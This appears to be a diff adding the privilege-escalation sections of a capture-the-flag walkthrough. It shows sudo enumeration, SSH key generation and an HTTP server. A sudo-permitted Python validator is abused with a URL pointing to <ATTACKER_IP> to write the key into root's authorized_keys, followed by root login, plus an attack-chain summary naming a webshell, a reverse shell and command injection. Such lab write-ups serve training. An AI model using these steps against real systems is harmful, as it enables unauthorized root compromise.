@@ -121,6 +121,113 @@ rlwrap nc -lvnp 5555
 - steve@variatype
 
 
+## 8. User Flag
+```bash
+cat /home/steve/user.txt
+```
+## 9. Privilege Escalation to Root
+- Check sudo permissions
+``` bash
+sudo -l
+```
+# Result
+- (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
+
+
+## 10. Exploitation
+
+# Generate SSH key
+```bash
+ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
+```
+
+# Prepare key
+``` bash
+mkdir -p /tmp/serve
+cp /tmp/rootkey.pub /tmp/serve/authorized_keys
+```
+# Start HTTP server
+```bash
+cd /tmp/serve
+python3 server.py
+```
+# Execute exploit (target)
+```bash
+sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+"http://<ATTACKER_IP>:8888/%2Froot%2F.ssh%2Fauthorized_keys"
+```
+
+
+## 11. Root Access
+```bash
+ssh -i /tmp/rootkey root@<TARGET_IP>
+```
+# Verify
+- whoami
+  - root
+
+
+## 12. Root Flag
+```bash
+cat /root/root.txt
+```
+
+
+## Attack Chain
+
+# VHost Discovery
+
+→ File Upload Exploit
+→ Arbitrary File Write
+→ Webshell (RCE)
+→ Reverse Shell (www-data)
+→ ZIP Command Injection
+→ Cron Execution
+→ Shell as steve
+→ Sudo Misconfiguration
+→ Arbitrary File Write (root)
+→ SSH Key Injection
+→ Root Access
+
+
+## Key Findings
+
+* Arbitrary file write via file upload
+* Remote code execution via webshell
+* Command injection via filename
+* Insecure cron processing
+* Misconfigured sudo rule
+* Arbitrary file write as root
+
+
+
+# Conclusion
+- The exploitation relied on chaining multiple vulnerabilities, resulting in full system compromise from initial web access to root privileges.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
